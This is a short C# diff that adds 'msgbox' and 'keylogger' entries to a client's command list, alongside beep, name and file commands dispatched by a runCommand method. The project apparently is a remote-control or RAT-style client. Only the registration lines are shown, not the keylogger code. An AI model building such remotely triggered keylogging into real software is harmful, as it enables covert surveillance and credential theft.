@@ -16,6 +16,8 @@ namespace Client.Commands
             this.commands.Add(new Beep("beep"));
             this.commands.Add(new GetName("name"));
             this.commands.Add(new File("file"));
+            this.commands.Add(new MsgBox("msgbox"));
+            this.commands.Add(new keyLogger("keylogger"));
         }
 
         public string runCommand( string cmd)
